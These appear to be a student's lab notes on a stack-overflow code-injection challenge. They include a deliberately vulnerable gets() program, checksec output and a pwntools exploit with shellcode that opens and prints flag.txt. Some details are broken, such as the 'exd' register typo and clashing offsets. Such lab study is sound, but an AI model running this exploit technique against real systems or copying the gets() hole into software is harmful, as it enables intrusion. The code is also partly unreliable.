```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>  

int main(int argc, char **argv){

	char buffer[{{buffsize}}];
	unsigned long ret;

	gets(buffer);

	ret = __builtin_return_address(0);


	if((ret & 0xfffffff00000 ) != 0x7ffffff00000) {
		printf("64-bit matrix calibration failed... (%p)\n", ret);
		_exit(1);
	}

}
```

### What is code injection
- Supply code and trick the program into executing the code
- supply through `gets()` and environment variables
- `gets()` seems promising for this one

```bash
root@aec1c95ac7fb:~/host-share/CS4401# checksec ./stack4-64 
[*****] '/root/host-share/CS4401/stack4-64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled #means we can execute code on the stack!!
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments #sections where we can read write and execute
```

vmmap: gdb command that gives you a a layout of virtual address space. includes permissions
- from this we learn that the stack is `rwx`
- We can write executable code to the stack!
- Why would we have an executable stack
	- History: hardware didn't have enough bits to specify difference between read, write, and executable
	- Now: Browsers need to optimize javascript code to execute them fast!!


**What do we want our injected code to do?**
- <mark style="background: #ADCCFFA6;"> Program to spawn a shell with root permissions</mark>
- a function like the win functions we've seen before
**How do we write the code?**
- Use the exec system call!
- `bin\shell`

`injection.c`
```c
#include <fcntl.h>

int main(){
	//open, sendfile
	
	fd = open("./flag.txt", O_RDONLY); // open syscall
	
}
```

### Cool Shellcode Website
https://shell-storm.org/shellcode/index.html

### SIGSEGV vs. SIGBUS
`SIGBUS`: you are trying to use an impossible value as an address.
	ex: you overwrote rbp with a cyclic pattern (see [[Stack3]])

`SIGSEGV`: You have a valid address, but are tying to do something illegal with it

**arrise from the same problem**: we did something that caused a pointer to be corrupted

another signal
`SIGILL`: Illegal Instruction; when you try to execute something that isn't actual instructions

### stack4.py
```python
from pwn import *
import os

elf = ELF('./stack4')
context.binary=elf
context.log_level = 'debug'
context.arch = 'asm64'


offset = 76
ret_addr = 0xffffd3d0

code = asm('''
		/* pushes string onto stack */
		push 0x7478
		mov rax, 0x742e67616c662f2e
		push rax
		
		/* open("./flag.txt", flags) */
		mov rdi, rsp
		xor esi, esi
		xor exd, edx
		mov eax, 2
		syscall

		/* sendfile(1, fd, 0, 0ff) */
		mov rsi, rax
		xor edx, edx
		mov r10, 0xff
		mov rdi, 1
		mov eax, 40
		syscall
		''')

#How do we know the address of the string?
#push ascii ont to the stack
#We do not need to know where the code will be loaded onto the stack
exploit_str = flat({40:0x007fffffffe4ed+48, 48:code})

p = gdb.debug('./stack4-64', gdbscript = '''
	b main
	shell tmux select-layout main-vertical
	shell tmux swap-pane -U
	''')

p.sendline(exploit_str)

p.wait()
p.recvall()
```

1. xor something with itself, sets reg to zero
	1. why? Doesnt include a null byte! (Reading will sometimes stop on null bytes or newline characters, depending on the function!)
2. when you use 32-bit registers in 64-bit assembly, remianing higher bits will be zeroed out.

### Shellcode issues
1. looks like the beginning is corrupted. You guessed the stack address of the code slightly wrong and started executing in the middle of your injected code
2. looks like the end is corrupted. You have a null byte or newline character in your code and it stopped reading halfway through your code

### NOP Slide
- Gives us some leeway for guessing the address of the shellcode, since *GDB doesn't give us a fully accurate address*
- About 10,000 is a good amount of NOPs
- To Make work on the server, just increase length of nop sled
- **Try to make the address jump to the middle of the sled**